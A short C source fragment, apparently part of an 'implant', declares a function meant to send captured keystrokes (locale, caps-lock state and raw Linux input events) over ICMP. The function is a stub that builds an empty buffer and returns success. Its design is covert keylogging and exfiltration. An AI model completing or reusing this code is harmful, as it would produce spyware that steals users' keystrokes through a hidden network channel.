
#include <linux/input.h>

#include "implant.h"

/* Layout of the DATA packet is following
 * [ Locale (length: 31), using_cap_lock, struct input_event dump ]
 */
int send_key_icmp(implant_t *implant, struct input_event event) {

    uint8_t payload[sizeof(struct input_event) + 32] = {0};
    

    return SUCCESSFUL;
}

